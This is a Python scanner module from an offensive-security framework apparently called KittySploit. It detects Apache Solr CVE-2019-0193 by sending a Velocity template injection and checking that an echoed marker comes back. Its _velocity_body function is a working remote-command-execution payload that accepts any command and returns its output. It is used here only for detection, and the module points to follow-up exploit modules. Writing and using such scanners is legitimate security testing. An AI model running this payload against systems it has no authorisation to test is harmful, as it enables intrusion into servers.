#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Apache Solr CVE-2019-0193 Velocity template RCE detection."""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Apache Solr CVE-2019-0193 Velocity RCE Detection',
        'description': (
            'Detects CVE-2019-0193 by running a marker echo through the Velocity '
            'response writer on /{core}/select (wt=velocity).'
        ),
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': [
            'web', 'scanner', 'cve', 'cve2019', 'solr', 'apache', 'velocity', 'rce', 'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 3,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.5,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {'capability': 'admin_surface', 'from_detail': 'Velocity select RCE'},
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [
                    'exploits/multi/http/apache_solr_cve_2019_0193_rce',
                    'exploits/multi/http/apache_solr_cve_2023_50386_rce',
                ],
            },
        },
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2019-0193',
            'https://solr.apache.org/security.html#cve-2019-0193',
        ],
        'cve': 'CVE-2019-0193',
    }

    port = OptPort(8983, 'Solr HTTP port', True)
    ssl = OptBool(False, 'Use HTTPS', True, advanced=True)
    base_path = OptString('/solr', 'Solr base path', False, advanced=True)
    collection = OptString('', 'Core/collection (auto if empty)', False, advanced=True)

    def _solr_path(self, suffix: str) -> str:
        base = str(self.base_path or '/solr').strip()
        if not base.startswith('/'):
            base = f'/{base}'
        base = base.rstrip('/')
        if not suffix.startswith('/'):
            suffix = f'/{suffix}'
        return f'{base}{suffix}'

    def _velocity_body(self, command: str) -> bytes:
        escaped = command.replace("'", "\\'")
        tpl = (
            'q=1&wt=velocity&v.template=custom&v.template.custom='
            '%23set(%24x=%27%27)'
            '%23set(%24rt=%24x.class.forName(%27java.lang.Runtime%27))'
            '%23set(%24chr=%24x.class.forName(%27java.lang.Character%27))'
            '%23set(%24ex=%24rt.getRuntime().exec(%27'
            f'{escaped}'
            '%27))'
            '%24ex.waitFor()'
            '%25'
            '%23set(%24out=%24ex.getInputStream())'
            '%23foreach(%24i%20in%20[1..%24out.available()])'
            '%24str.valueOf(%24chr.toChars(%24out.read()))'
            '%23end'
        )
        return tpl.encode()

    def _discover_core(self) -> str:
        selected = str(self.collection or '').strip()
        if selected:
            return selected
        for suffix in ('/admin/collections?action=LIST', '/admin/cores?action=STATUS'):
            r = self.http_request(method='GET', path=self._solr_path(suffix), allow_redirects=False)
            if not r or int(r.status_code or 0) != 200:
                continue
            try:
                data = r.json()
                cols = data.get('collections') or list((data.get('status') or {}).keys())
                if cols:
                    return str(cols[0])
            except Exception:
                continue
        return 'gettingstarted'

    def run(self):
        info = self.http_request(
            method='GET',
            path=self._solr_path('/admin/info/system'),
            allow_redirects=False,
        )
        if not info or int(info.status_code or 0) not in (200, 401):
            return False
        if 'solr' not in (info.text or '').lower() and int(info.status_code or 0) != 401:
            return False

        marker = self.random_text(10)
        core = self._discover_core()
        r = self.http_request(
            method='POST',
            path=self._solr_path(f'/{core}/select'),
            data=self._velocity_body(f'echo {marker}'),
            headers={'Content-Type': 'application/x-www-form-urlencoded'},
            allow_redirects=False,
        )
        if not r or int(r.status_code or 0) != 200:
            return False
        body = r.text or ''
        if marker not in body:
            return False
        self.set_info(
            severity='critical',
            reason=f'Apache Solr CVE-2019-0193 Velocity RCE confirmed on core {core!r}',
            path=self._solr_path(f'/{core}/select'),
            evidence=f'marker={marker}',
        )
        return True
